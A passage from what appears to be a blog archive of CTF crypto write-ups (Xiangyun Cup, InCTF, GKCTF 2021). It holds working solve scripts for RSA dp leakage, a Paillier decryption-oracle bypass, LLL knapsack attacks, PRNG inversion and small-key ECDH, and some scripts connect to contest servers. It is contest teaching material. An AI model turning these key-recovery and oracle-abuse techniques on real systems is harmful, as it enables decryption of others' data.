105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81] ans = [] for i in range(0, 154): random.seed(seeds[i]) rands = [] for j in range(0,4): rands.append(random.randint(0,255)) print(rands) ans.append(res[i] ^ rands[i%4]) print(ans) # print(bytes(ans)) ans = [53, 51, 55, 50, 48, 48, 55, 52, 50, 54, 49, 54, 49, 49, 57, 54, 49, 53, 52, 52, 48, 53, 54, 52, 48, 53, 48, 52, 49, 49, 48, 55, 51, 54, 54, 53, 57, 49, 57, 48, 49, 56, 51, 49, 57, 52, 48, 53, 50, 57, 54, 54, 55, 50, 51, 48, 55, 54, 48, 52, 49, 50, 54, 54, 54, 49, 48, 56, 57, 51, 49, 53, 56, 54, 55, 56, 48, 57, 50, 56, 52, 53, 52, 53, 48, 50, 51, 50, 53, 48, 56, 55, 57, 51, 50, 55, 57, 53, 56, 53, 49, 54, 51, 51, 48, 52, 57, 49, 56, 56, 48, 55, 54, 53, 54, 57, 52, 54, 49, 52, 55, 53, 55, 53, 50, 56, 48, 48, 54, 51, 50, 48, 56, 49, 54, 56, 56, 49, 54, 52, 53, 55, 51, 52, 54, 55, 53, 53, 50, 50, 55, 48, 53, 55] print(bytes(ans)) # 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057 然后常规解泄露dp的rsa\ne = 65537 n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113 dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657 c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751 import gmpy2 from Crypto.Util.number import * dp = 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057 e=0x10001 n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391 c=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151 for i in range(1,65538): if (dp*e-1)%i == 0: if n%(((dp*e-1)//i)+1)==0: p=((dp*e-1)//i)+1 q=n//(((dp*e-1)//i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi print(long_to_bytes(pow(c,d,n))) # flag{74281db3-c6f0-e59a-4da6-39b8c71250fe} guess # 这个题妥妥的被找到非预期了。。。。\nAnalysis and implement # 这个地方是非预期的核心这里会随机选取一个key附加上明文上\nKEY比较特别的是，其中每个元素要么在KEY[R]上，要么在KEY[R+1]上，这是该非预期的基础\nself._send(\u0026#34;Give me m0.\u0026#34;) plaintext1 = int(self._recv().decode()) self._send(\u0026#34;Give me m1.\u0026#34;) plaintext2 = int(self._recv().decode()) if ( plaintext1 \u0026lt;= 2 or plaintext2 \u0026lt;= 2 or len(bin(plaintext1)) != len(bin(plaintext2)) ): return R = 2 * random.randint(0, 39) I = random.randint(0, 1) cipher1 = enc(n, g, plaintext1 * plaintext2 * KEY[R]) cipher2 = enc(n, g, plaintext1 * plaintext2 * KEY[R + 1]) self._send(\u0026#34;This is a ciphertext.\u0026#34;) self._send(str([cipher1, cipher2][I])) 然后我们可以输入一次密文来得到明文,但不能输入cipher1和cipher2\ncipher = int(self._recv().decode()) plaintext = str(dec(n, g, LAM, cipher)) if int(plaintext) == plaintext1 * plaintext2 * KEY[R] or int(plaintext) == plaintext1 * plaintext2 * KEY[R+1]: return self._send(\u0026#34;This is the corresponding plaintext.\u0026#34;) self._send(plaintext) 根据同态的原理可以构造payload绕过检测\n$C_0={C_1}^{m_1}=g^{m_1 * m_1 * m_2 * k}r^n \\;mod \\;n^2$\n解密后可以得到：\n$M\\div(m_1 * m_1 * m_2)=k$\n此时如果输入0如果报错则当前k对应的下标是0，否则下标为1\n又因为\nassert key[0] == 119 and key[1] == 241 and key[2] == 718 and key[3] == 647 由这个hint我们知道服务器上面的key是不变的\n只要重复访问服务器就能把key表oracle出来然后解得key到我们记录的表里面去找就好了\nsolution # import random import hashlib from math import gcd from pwn import * from icecream import * from MyRE import CatNum from itertools import product # from MyRE import * # from rich import * from rich.traceback import install install() # ----------------------------------- String = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz\u0026#34; # nc 47.104.85.225 57811 def pow1(): io.recvuntil(\u0026#39;?+\u0026#39;) s2 = io.recvuntil(\u0026#39;) \u0026#39;)[:-2] HASH = io.recvuntil(\u0026#39;\\n\u0026#39;)[3:-1] print(s2) print(HASH) for i in product(String,repeat=4): s1 = \u0026#39;\u0026#39;.join(i) # print(s1.encode())\\ s1 = s1.encode() s0 = s1+s2 # print(s0) HASH1 = hashlib.sha256(s0).hexdigest().encode() # print(HASH1) # input() if(HASH==HASH1): print(s1) io.sendline(s1) return def enc(n, g, m): while 1: r = random.randint(2, n - 1) if gcd(r, n) == 1: break c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2) return c def init(): # pow1() # io.interactive() buf = io.recvuntil(\u0026#39;round\u0026#39;) round = io.recvuntil(\u0026#39;Step 1\u0026#39;) ic(round) io.recvuntil(\u0026#39;KeyGen. This is my public key.\u0026#39;) buf = io.recvuntil(\u0026#39;Step \u0026#39;) ans = CatNum(buf) n,g = int(ans[0]),int(ans[1]) ic(n) ic(g) return n,g # ===================================== key0={130, 899, 903, 521, 142, 783, 530, 148, 416, 288, 550, 939, 427, 299, 558, 942, 685, 307, 566, 313, 577, 585, 718, 983, 349, 355, 611, 995, 614, 746, 751, 114, 498, 885, 119, 637, 638, 639} key1={128, 129, 646, 647, 521, 780, 396, 526, 653, 400, 783, 530, 148, 918, 281, 158, 286, 416, 548, 550, 936, 810, 939, 427, 299, 558, 942, 944, 430, 307, 309, 566, 313, 186, 577, 201, 585, 461, 718, 333, 977, 727, 216, 983, 860, 355, 613, 614, 232, 745, 746, 877, 237, 241, 113, 114, 244, 885, 119, 888, 121, 123, 637, 638, 639} def get_index(k): if(k in key0): return \u0026#39;0\u0026#39; else: return \u0026#39;1\u0026#39; def oracle(n,g): io.recvuntil(\u0026#39;Please give me one decimal ciphertext.\\n\u0026#39;) c = enc(n,g,123321123321123321123321) io.sendline(str(c)) io.recvuntil(\u0026#39;Step 3\u0026#39;) io.recvline() # s3 m1 = 787 m2 = 929 io.recvuntil(\u0026#39;Give me m0.\\n\u0026#39;) io.sendline(str(m1)) io.recvuntil(\u0026#39;Give me m1.\\n\u0026#39;) io.sendline(str(m2)) io.recvuntil(\u0026#39;This is a ciphertext.\\n\u0026#39;) buf = io.recvline() ans = CatNum(buf) c1 = int(ans[0]) # print(buf,c1) # init x1 = enc(n,g,787) c1x1 = pow(c1,m1,n**2) # ic(c1x1) io.sendline(str(c1x1)) io.recvuntil(\u0026#39;This is the corresponding plaintext.\\n\u0026#39;) buf = io.recvline() # print(ans) ans = CatNum(buf) tmp = int(ans[0]) io.recvuntil(\u0026#39;-\u0026gt; c0 , m1 -\u0026gt; c1)?\\n\u0026#39;) k = (tmp)//(m1*m2*m1) ic(k) _01 = get_index(k) io.sendline(_01) res = io.recvline() print(res) # io.interactive() return res,k time=0 # nc 47.104.85.225 57811 io = remote(\u0026#39;47.104.85.225\u0026#39;,57811) pow1() for i in range(100): n,g = init() res,k = oracle(n,g) if(b\u0026#39;Sorry\u0026#39; in res): print(f\u0026#39;{k}:0\u0026#39;) key0.add(k) time=0 io.close() io = remote(\u0026#39;47.104.85.225\u0026#39;,57811) pow1() else: sleep(0.25) print(f\u0026#39;{k}:1\u0026#39;) key1.add(k) time+=1 if(time==32): print(\u0026#39;get it\u0026#39;) print(io.recv(2048)) exit() print(f\u0026#39;key0={key0}\u0026#39;) print(f\u0026#39;key1={key1}\u0026#39;) print(time) ic| round: b\u0026#39; 32 Step 1\u0026#39; ic| n: 140359393736491083554637764633966036595869523810831521796100389946301014713501052438423015898275061604402441271059379191254720192715521217765512578594812234847906891823150303725078568490730815789232226736630007558775806211165296878777428640046549542601742670073385256102038588867770586061404269183834130922097 ic| g: 140359393736491083554637764633966036595869523810831521796100389946301014713501052438423015898275061604402441271059379191254720192715521217765512578594812234847906891823150303725078568490730815789232226736630007558775806211165296878777428640046549542601742670073385256102038588867770586061404269183834130922098 ic| k: 130 b\u0026#39;Good! You are right\\n\u0026#39; 130:1 get it b\u0026#39;flag{e87fdfb6-8007-4e1c-861f-5bde3c8badb3}\\n\u0026#39; [*] Closed connection to 47.104.85.225 port 57811 myRSA # 小数学题，利用各种姿势消去z对解密得影响\n核心点\ndef encry(message,key,p,q,e): k1,k2 = key[random.randint(0,127)],key[random.randint(0,127)] x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) y = 2*p*q + p + q z = k1 + k2 c = pow(b2l(message),e,p*q) return x * c + y * c + z # enc 首先\n$设t=p+q$\n$(enc-z)/c=(x+y)-4n=t^3-t^2+t$\n但由于 $f(t)=t^3-t^2+t-9999$ 的图像几乎是一条直线，我们推断，此时z对于解这个方程没有实质性的影响\n测试后发现确实可以消去第一次加密时z的影响\n解密时也可以用x+y消去z对flag的影响\nz//(x+y)=0\nfrom Crypto.Util.number import * from Crypto.Util.number import getPrime,bytes_to_long as b2l import libnum from gmpy2 import iroot from icecream import * import sympy as sp # 导入sympy包、 def getpq(n,e,enc,c): tmp = 400000 ic(tmp) ans = enc//c -tmp -4*n x = sp.Symbol(\u0026#39;x\u0026#39;) # 定义符号变量 f = x**3 - x**2 + x - ans # 定义要求解的一元三次方程 ans = sp.solve(f) # print(ans) t = int(ans[2].round()) ic(t) tmp = iroot(t*t-4*n,2) ic(tmp) if(tmp[1] == True): delta = tmp[0] p = (t+delta)//2 ans = t**3 - t**2 + t print(n%p) ic(p) return p # 一次交互后得到的数据 n = 66027874281672625418586014781126070908243950646389324074550248999679090401150270793389452270314828298481437497840416396018574761898600856029902467560028361877554457938912404358968210921272837218306889478597234820590780596868027285957738861052042217870708996313230729115851397741357365848182263953315379303203 e = 65537 message = b\u0026#39;1231231312312312313123\u0026#39; c = pow(b2l(message),e,n) enc = 2786282534107784071949674754303734020650420550514064517704448066809278965224884310691670432441397979710035489386642473027744366146283566077172758576117265010888225901430814453103910642061532363684990980080593171873048076522753507082554621333455105446034271978972878134597921516292423901550995709181303022297139396128082022193615685724911328311390083321186035987746342068856533118816750276771278003232809361817465525887406183533073435476911136829775173155132394236172457900926847903014330722145729653282601258124899631596559793043199596264295846181613188399943356771658381560774428425036945242894731920547142207496951001372212394788053725065262462489938796299464287972476543278196732420981982981923866883740677815684307375214870832207719694203331026829445710224285190480 flagenc = 78903156043541822956852921255839504785260043170754244208159263853595508405000661899479307588531494172830632220991906679919999441798497272603229277113581316208572288228086544225197245626229321664099299589135332933949675253738548931053641537046898654150676091285693057337873250759686984233682913388477992334871253653295943818266597281224943136933411417199795127815822097900855479634034406709830823051590719193303685067733559940313006125179805670789881285419162909762014157603424444680011222474284489067733520824336575376527926069324059697680207015464280592590151869974781941122398578485426146276184697907560587701585522746826606269636562989809117072089021357481402267496699431701068851120069674664273560247308363437176623358041554600504472302094490793591097239195676611890 # ========================= p =getpq(n,e,enc,c) q = n//p print(n==p*q) # k = k1+k2 x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) y = 2*p*q + p + q z = enc-(x+y)*c print(z) # print(z==k) flagc = (flagenc)//(x+y) ic(z//(x+y)) # q=n//p # print(q) # n=p*q phi=(p-1)*(q-1) d = libnum.invmod(e,phi) print(long_to_bytes(pow(flagc,d,n))) # bytes_to_long() # long_to_bytes() \u0026#39;\u0026#39;\u0026#39; return x * c + y * c + z \u0026#39;\u0026#39;\u0026#39; # flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1} Challenge-attachment # attachment 和20年相比,诸神黄昏行为减少了，但是仍有迷惑操作，比如放题秒解,不解签到题去解高难题的操作\n","date":"23 August 2021","permalink":"/achieve/ctf/%E7%A5%A5%E4%BA%912021/","section":"archive","summary":"","title":"WriteUp for crypto in 翔云ber 2021"},{"content":"\rWriteUp for InCTF # gold_digger # def encrypt(msg, N,x): msg, ciphertexts = bin(bytes_to_long(msg))[2:], [] for i in msg: while True: r = random.randint(1, N) if gcd(r, N) == 1: bin_r = bin(r)[2:] c = (pow(x, int(bin_r + i, 2), N) * r ** 2) % N ciphertexts.append(c) break return ciphertexts The main problem\nc = (pow(x, int(bin_r + i, 2), N) * r ** 2) % N if $flag_i$ is 1 ,the bin_r + i well be odd\nelse the $r+i$ well be even\nwe can determine the flag by calculating Jacobi symbol of c to N\nsolution # from Crypto.Util.number import * import gmpy2 from data import ct N = 76412591878589062218268295214588155113848214591159651706606899098148826991765244918845852654692521227796262805383954625826786269714537214851151966113019 x = 72734035256658283650328188108558881627733900313945552572062845397682235996608686482192322284661734065398540319882182671287066089407681557887237904496283 plaintext = \u0026#39;\u0026#39; for line in ct: if gmpy2.jacobi(line,N) == -1: plaintext += \u0026#39;1\u0026#39; else: plaintext += \u0026#39;0\u0026#39; print(long_to_bytes(int(plaintext,2))) # inctf{n0w_I_4in7_73ll1ng_u_4_g0ldd1gg3r} Lost Baggag # In this challenge , we need to analyze a backpack encryption system\nthe challenge give us only pubkey and cipher\nso，i tried Lattice reduction algorithm to solve it\nsagemath lattice reduction code：\nimport pickle data = pickle.load(open(\u0026#39;enc.pickle\u0026#39;, \u0026#39;rb\u0026#39;)) cip = data[\u0026#39;cip\u0026#39;] pbkey = data[\u0026#39;pbkey\u0026#39;] print(len(pbkey)) S = cip M = pbkey n = len(M) L = matrix.zero(n + 1) for row, x in enumerate(M): L[row, row] = 2 L[row, -1] = x L[-1, :] = 1 L[-1, -1] = S f = open(\u0026#39;LLLdata.txt\u0026#39;,\u0026#39;a+\u0026#39;) res = L.LLL() for i in range(144): ans = list(res[i]) f.write(str(ans)+\u0026#39;\\n\u0026#39;) print(ans) The matrix is looks like: $$\\begin{pmatrix} 2\u0026amp;0\u0026amp;0\u0026amp;\\cdots\u0026amp;0\u0026amp;PK_1\\\\ 0\u0026amp;2\u0026amp;0\u0026amp;\\cdots\u0026amp;0\u0026amp;PK_2 \\\\ 0\u0026amp;0\u0026amp;2\u0026amp;\\cdots\u0026amp;0\u0026amp;PK_3 \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \u0026amp; \\vdots \\\\ 0\u0026amp;0\u0026amp;0\u0026amp;\\cdots\u0026amp; 2 \u0026amp; PK _ n \\\\ 1\u0026amp;1\u0026amp;1\u0026amp;\\cdots \u0026amp;1\u0026amp;ct \\end{pmatrix} $$\nLets check the LLLdata.txt\nfortunately,I find a vector only have 1 and -1\ntry to docode it and get the flag\nfrom Crypto.Util.number import * ans = [-1, 1, -1, -1, -1, -1, -1, 1, -1, -1, -1, -1, -1, -1, 1, 1, -1, -1, -1, 1, 1, -1, -1, 1, 1, 1, -1, 1, -1, -1, 1, 1, 1, -1, 1, 1, 1, -1, -1, 1, -1, -1, -1, -1, -1, 1, -1, 1, 1, 1, -1, 1, -1, -1, 1, 1, -1, 1, -1, -1, 1, -1, -1, 1, -1, -1, -1, -1, -1, 1, -1, 1, -1, 1, -1, 1, -1, -1, 1, 1, 1, -1, 1, 1, -1, -1, -1, 1, -1, -1, -1, 1, -1, -1, -1, 1, -1, -1, 1, -1, -1, -1, -1, 1, 1, -1, -1, 1, 1, -1, -1, 1, 1, 1, -1, 1, -1, -1, -1, 1, -1, -1, 1, 1, 1, -1, -1, 1, 1, -1, -1, -1, 1, -1, -1, 1, -1, 1, 1, -1, 1, -1, -1, 1] flag = \u0026#39;\u0026#39; for i in ans: if(i == -1): flag+=\u0026#39;1\u0026#39; else: flag+=\u0026#39;0\u0026#39; msg = int(flag[::-1],2) print(long_to_bytes(msg)) flag = \u0026#39;\u0026#39; for i in ans: if(i == -1): flag+=\u0026#39;0\u0026#39; else: flag+=\u0026#39;1\u0026#39; msg = int(flag[::-1],2) print(long_to_bytes(msg)) # inctf{wr5_m4_b4g?} Right Now Generator # This challenge is easy after analysing\nIt’s more like a reverse than a crypto\u0026hellip;.\nanalysis and implement # Our major trouble is to find The Inverse function of functioncs below,\nAnd how we think about finding seed-sequence from a-sequence given by the attachment\ndef wrap(self, pr=True): hsze = self.sze//2 for i in range(self.sze): r1 = self.seed[i] r2 = self.seed[(i+hsze)%self.sze] self.seed[i] = ((r1^self.pad)*r2)%self.mod self.ctr = 0 def next(self): a, b, c, d = (self.seed[self.ctr^i] for i in range(4)) mod = self.mod k = 1 if self.ctr%2 else 2 a, b, c, d = (k*a-b)%mod, (b-c)%mod, (c-d)%mod, (d-a)%mod self.ctr += 1 if self.ctr==64: self.wrap(pr=False) return a With a simple algebraic calculation\nWe can write out Inverse function easily\nfrom a-sequence get seed-sequence:\ndef from_aa_get_seed(aa): seed=[] for i in range(0,63,4): tmp = aa[i:i+4] a1,a2,a3,a4 = tmp s0 = (a1+a2)%mod s1 = (2*a2+a1)%mod s2 = (a3+a4)%mod s3 = (2*a4+a3)%mod seed = seed + [s0,s1,s2,s3] return seed inv_wrap:\ndef inv_wrap(seed): for i in range(32): r2 = seed[i] r1 = ((seed[i+32]*libnum.invmod(r2,mod))%mod)^pad seed[i+32]=r1 for i in range(32): r2 = seed[i+32] r1 = ((seed[i]*libnum.invmod(r2,mod))%mod)^pad seed[i] = r1 return seed Combined them into decryption code\nSolution # import random, hashlib, os, gmpy2, pickle import libnum from libnum.modular import invmod from Crypto.Util.number import * from Crypto.Cipher import AES # ----------------------------------- pad = 0xDEADC0DE sze = 64 mod = 18446744073709551629 def inv_wrap(seed): for i in range(32): r2 = seed[i] r1 = ((seed[i+32]*libnum.invmod(r2,mod))%mod)^pad seed[i+32]=r1 for i in range(32): r2 = seed[i+32] r1 = ((seed[i]*libnum.invmod(r2,mod))%mod)^pad seed[i] = r1 return seed def from_aa_get_seed(aa): seed=[] for i in range(0,63,4): tmp = aa[i:i+4] a1,a2,a3,a4 = tmp s0 = (a1+a2)%mod s1 = (2*a2+a1)%mod s2 = (a3+a4)%mod s3 = (2*a4+a3)%mod seed = seed + [s0,s1,s2,s3] return seed def from_leak_get_aa(leak): aa =[] for i in range(0,1024,16): tmp =leak[i:i+16] s = bytes.fromhex(tmp) tmp = bytes_to_long(s) aa.append(tmp) return aa def next(seed1,i): ctr = i a, b, c, d = (seed1[ctr^i] for i in range(4)) mod = 18446744073709551629 k = 1 if ctr%2 else 2 # 1 和 2 交替出现,可控 a, b, c, d = (k*a-b)%mod, (b-c)%mod, (c-d)%mod, (d-a)%mod return a enc = {\u0026#39;cip\u0026#39;: \u0026#39;71d39d37d3c03e08b82d81ae3b4be658e2dbdaee6a73d73a3e88271f423db30f0422d4fb9475ceef281a746afa86eaee\u0026#39;, \u0026#39;iv\u0026#39;: \u0026#39;cbf411655acfd7f670968ccf44d74e05\u0026#39;, \u0026#39;leak\u0026#39;: \u0026#39;3aeba43302ab9ad0df898103fc0223be23f5ec10f62ad48744c2ec06bc4ac9b2290aff5f5d17fc2ff2a1115e657ddced0f12238ca12b076bf85fed0ce621202d159c014907e39ba7373ada78a4dea3a76bfb9ff09a8f10705cd95a47edd743fde25f32ab545bf98bba1344bed511b0c095ddede11b4a35bc02acb34d3aef46c56bfc9b668c82c0d3da76307dd87016e1a7df478cdefb98d4fe991088f478f24390fac3d4f0d0673d2801f37df421ab17cb72af64a8b21ebf9d73c3ef35a8bd5fe98c62a910ef8b859b86a58bf670fe544266bc37a36d3828e7397bac0b817f41522e76a68661b3e9952ed3d2eb7846b2f9cd2c1cc44eda2ac536eb826ce922afaa4c7d61ff3db9023cf2fff8fb34791954fbb1541f043fe26e92fb79f119fbe175bd1b551dd1225275a457580bef4301505f474060f39caad6d3172f17a9a21f68e66b59a13e817b0201dbdbcc1e6c1d80ab2e8d38f7f0a62d0bb3577da845643273b1743f5aac064422bdbd85358f6da726f9114c5553432d4f4e2f43f997975add7ea3b6a56b689ff84f7635815879e28d8c7421b979449f5bccb29cce745862610af8c99379c60e1205d5e1eda9d2f5243d4da4325ac142bd196d1777bd2d4f61eb355b7fca3e16295d05e8a21e75f010272ce159afb49fa3d4b97bd242304e34599f7bc8edf5b4430bb42b12437b7c27583d303043311afd56fae70a7d6b\u0026#39;} leak = enc[\u0026#39;leak\u0026#39;] aa = from_leak_get_aa(leak) seed = from_aa_get_seed(aa) seed_prev = inv_wrap(seed) out1 = \u0026#39;\u0026#39;.join([format(next(seed_prev,i), \u0026#39;016x\u0026#39;) for i in range(64)]) key = bytes.fromhex(out1) key = hashlib.sha256(key).digest()[:16] cip = enc[\u0026#39;cip\u0026#39;] iv = enc[\u0026#39;iv\u0026#39;] cip = bytes.fromhex(cip) iv = bytes.fromhex(iv) aes = AES.new(key, AES.MODE_CBC, iv) flag = aes.decrypt(cip) print(flag) # b\u0026#39;inctf{S1mpl3_RN65_r_7h3_b35t!_b35e496b4d570c16}\\x01\u0026#39; Eazy Xchange # there we can exchange gen_key into a simple form\ndef gen_key(G, pvkey): G = sum([i*G for i in pvkey]) return G def gen_key(G, pvkey): tmp = sum([i for i in pvkey]) return G*tmp and the tmp is small $(tmp \u0026lt;1024)$\nand there tell us $B=tmp*G$\ndef gen_bob_key(EC, G): bkey = os.urandom(4) B = gen_key(G, bkey) return B, bkey so\n$SS=tmp_1*tmp_2 * G$\nand $SS=tmp_1*tmp_2\u0026lt;1024 * 1024$\nWe can try out $tmp_1*tmp_2$ easily\nimport os, hashlib, pickle from tqdm import tqdm # ----------------------------------- from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad p = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF a = p - 3 b = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B EC = EllipticCurve(GF(p), [a, b]) G = EC.gens()[0] # 固定的点 def decrypt(cip, key,iv): key = hashlib.sha256(str(key).encode()).digest()[:16] cipher = AES.new(key, AES.MODE_CBC, iv) return cipher.decrypt(cip) data = {\u0026#39;cip\u0026#39;: \u0026#39;9dcc2c462c7cd13d7e37898620c6cdf12c4d7b2f36673f55c0642e1e2128793676d985970f0b5024721afaaf02f2f045\u0026#39;, \u0026#39;iv\u0026#39;: \u0026#39;cbd6c57eac650a687a7c938d90e382aa\u0026#39;, \u0026#39;G\u0026#39;: \u0026#39;(38764697308493389993546589472262590866107682806682771450105924429005322578970 : 112597290425349970187225006888153254041358622497584092630146848080355182942680 : 1)\u0026#39;} FLAG = data[\u0026#39;cip\u0026#39;] iv = data[\u0026#39;iv\u0026#39;] FLAG = bytes.fromhex(FLAG) iv = bytes.fromhex(iv) x = 38764697308493389993546589472262590866107682806682771450105924429005322578970 y = 112597290425349970187225006888153254041358622497584092630146848080355182942680 G = EC(x,y) print(G) SS = G for i in tqdm(range(2,1024*1024)): SS = SS+G msg = decrypt(FLAG, SS.xy()[0],iv) if(b\u0026#39;inctf\u0026#39; in msg): print(msg) break # inctf{w0w_DH_15_5o_c00l!_3c9cdad74c27d1fc} Encrypted Operations # 这个太哈人了 全是cpp（我tm直接吓出母语）😫😫😫\n审了一天\n发现印度老哥这个vector的理解和我不一样，缝缝补补终于搞出来了\n反正这个题应该很难有复现环境了\n(其实能把homomorphic_system复写一遍应该还是可以的？放在docker里面还是比较好部署的)\n就干脆简单说一下三个部分的思路好了🐫\nprat1\nfor (int x = 0; x \u0026lt; 20; x++) { for (int y = 0; y \u0026lt; 20; y++) { m[x][y] = ++val; } } int d = 20; int r = 3; int c = 3; for (int i = 0; i \u0026lt; 18; i++) { for (int j = 0; j \u0026lt; 18; j++) { for (int p = 0; p \u0026lt; 3; p++) { for (int q = 0; q \u0026lt; 3; q++) { mat.push_back(m[i + p][j + q]); } } } } for (int j = 0; j \u0026lt; int(mat.size()); j += 9) { v.push_back(slice(mat, j, j + 9));//切片矩阵化 } idx = Genrand(0, v.size() - 1); vector\u0026lt;int64_t\u0026gt; temp1(begin(v[idx]), end(v[idx])); vector\u0026lt;int64_t\u0026gt; mvector = temp1; sum1 = accumulate(mvector.begin(), mvector.end(), 0);//随机先去一个切片求和 FheEncrypt(mvector); EncryptedOperations(); vector\u0026lt;int64_t\u0026gt; p = FheDecrypt(); if (sum1 == 0) { cout \u0026lt;\u0026lt; \u0026#34;\\n\\nCHALLENGE CORRUPTED!!!!\u0026#34;; exit(0); } if (p[0] == sum1) cout \u0026lt;\u0026lt; \u0026#34;\\n\\nYou got all the encrypted operations right! Great!!\\n\\nNow on to the next\\n\\n\u0026#34;; else exit(0); 拿导外面跑一下发现其实就是对切片求和，由于temp1里面本质上是个等差数列，找一下规律就可以了\npart2同理\npayload1\n9 0 0 0 * 1 y 189 0 0 0 + 1 n 189 0 0 0 + 1 n + 20 0 0 0 * 1 y 830 0 0 0 + 1 n level2 对 p1 p2 取反使其抵消掉numVec里面除了m1[row[2]]以外的所有向量\n在 userinp生成处，往后多选了一位，这个操作可以在EncryptedOperations中对m1[row[2]]右移一位抵消掉影响，最有一位并不会消失，而是会将vector的长度扩展一位\np = vector\u0026lt;int64_t\u0026gt;(p.begin(), p.begin() + 5 + 1); exp\nfrom pwn import * from pwnlib.util.iters import random_permutation # crypto.challenge.bi0s.in 1221 data = \u0026#34;\u0026#34;\u0026#34;9 0 0 0 * 1 y 189 0 0 0 + 1 n 189 0 0 0 + 1 n + 20 0 0 0 * 1 y 830 0 0 0 + 1 n 0 0 0 0 0 \u0026gt; 1 n -1 -1 -1 -1 -1 * 1 n -1 -1 -1 -1 -1 * 1 n \u0026#34;\u0026#34;\u0026#34; io = remote(\u0026#39;crypto.challenge.bi0s.in\u0026#39;,1221) io.sendline(data) io.recvuntil(\u0026#39;flag\u0026#39;) io.recvuntil(\u0026#39;flag\u0026#39;) buf = io.recv(2048) if(b\u0026#39;inctf\u0026#39; in buf): print(buf) exit(0) # inctfi{m4st3r_0f_Encrypt3d_0p3r4t1on5_B3c0m3_u_H4v3!!} shell\n❯❯ inctf 22:18 python3 -u \u0026#34;c:\\Users\\16953\\Desktop\\inctf\\Encrypted Operations\\src\\exp.py\u0026#34; [x] Opening connection to crypto.challenge.bi0s.in on port 1221 [x] Opening connection to crypto.challenge.bi0s.in on port 1221: Trying 34.106.211.122 [+] Opening connection to crypto.challenge.bi0s.in on port 1221: Done b\u0026#39;: inctfi{m4st3r_0f_Encrypt3d_0p3r4t1on5_B3c0m3_u_H4v3!!}\\n\\n\\nThankyou for using the srvice! Sucessfully performed all operatoions!!\\n\\n\\nExiting!!\u0026#39; [*] Closed connection to crypto.challenge.bi0s.in port 1221 Challenge-attachment # Attachment ","date":"15 August 2021","permalink":"/achieve/ctf/inctf2021/","section":"archive","summary":"","title":"WriteUp for crypto in InCTF2021"},{"content":"[toc]\ngkctf2021 6-25 补档 # XOR # from Crypto.Util.number import * from hashlib import md5 a = getPrime(512) b = getPrime(512) c = getPrime(512) d = getPrime(512) d1 = int(bin(d)[2:][::-1] , 2) n1 = a*b x1 = a^b n2 = c*d x2 = c^d1 flag = md5(str(a+b+c+d).encode()).hexdigest() print(\u0026#34;n1 =\u0026#34;,n1) print(\u0026#34;x1 =\u0026#34;,x1) print(\u0026#34;n2 =\u0026#34;,n2) print(\u0026#34;x2 =\u0026#34;,x2) 这个题基本是靠约束条件对多余情况进行剪枝，捡到运算量在合理范围就可以了\n顺序不变时只需要考虑低位，除开异或条件外还计 算 $a*b =n;mod;2^{i}-1$ 来对已猜测数据进行低位检测\n这是一种模糊的条件，该条件是最终条件的必要条件\n顺序改变的情况，异或需要考虑高低位交换的情况，每次要四个bit同时运算看是否同时满足 n的高位和低位\n乘法条件中，低位由于没有进位，直接判断$a*b =n;mod;2^{i}-1$\n高位由于又进位，使用高位相同时的必要条件if n_highbits-temp2 \u0026gt;= 0 and n_highbits-temp2 \u0026lt;=((2\u0026lt;\u0026lt;i+1)-1): a = 111\nb = 100\na*a = 1 1000 1\nb*b = 010000\n当然，这依旧是一个十分粗略的必要条件。。。。\n正序exp\n# 初始化第1位的已知数：0 def getab(n,x,lenth): a_list=[0] b_list=[0] # 这里判断512位应该就够了阿。。。。 mask = 0 for i in range(lenth): # 取第n位 mask = 2**(i+1)-1 xi = (x\u0026gt;\u0026gt;i) \u0026amp; 1 nextA_list=[] nextB_list=[] for ai in range(2): for bi in range(2): for j in range(len(a_list)): if (ai^bi == xi): nlow = n \u0026amp; mask axbLow = (((ai\u0026lt;\u0026lt;i)+a_list[j])*((bi\u0026lt;\u0026lt;i)+b_list[j]))\u0026amp;mask if(nlow==axbLow): nextA_list.append((ai\u0026lt;\u0026lt;i)+a_list[j]) nextB_list.append((bi\u0026lt;\u0026lt;i)+b_list[j]) # a_list = nextA_list b_list = nextB_list for a in a_list: if(n%a==0): return(a,n//a) lenth = 512 n = 83876349443792695800858107026041183982320923732817788196403038436907852045968678032744364820591254653790102051548732974272946672219653204468640915315703578520430635535892870037920414827506578157530920987388471203455357776260856432484054297100045972527097719870947170053306375598308878558204734888246779716599 x = 4700741767515367755988979759237706359789790281090690245800324350837677624645184526110027943983952690246679445279368999008839183406301475579349891952257846 a,b 